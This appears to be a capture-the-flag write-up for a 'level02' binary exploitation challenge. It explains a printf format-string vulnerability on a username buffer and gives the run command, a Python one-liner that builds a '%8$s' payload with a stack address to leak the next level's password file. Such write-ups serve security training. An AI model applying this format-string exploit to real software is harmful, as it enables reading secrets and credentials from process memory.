# LEVEL02

## EXPLANATIONS

### BINARY BEHAVIOR

- binary is compiled for 64bits architecture
- only function main :
  - 3 buffers :
    - username <= stdin
    - password <= stdin
    - pass <= file level03/.pass
- printf(buf_username) format string exploit

### EXPLOIT STRATEGY

- format string inside username_buf
- address of pass_buf inside password_buf

- When program does a printf on "buf_username", it will print the string inside buf_pass
  - => It's level03 .pass file
- align stack inside/outside gdb
- bypass opening of .pass file inside gdb by updating string with level02 pass file
  - set {char [26]}string_addr="/home/users/level02/.pass"

### RUN COMMAND

```
python -c "print('%8\$s' + '\n' + '\x00\x00\x7f\xff\xff\xff\xec\xb0'[::-1])" > /tmp/exploit_string
cat /tmp/exploit_string - | env - PWD=$PWD /home/users/level02/level02
```
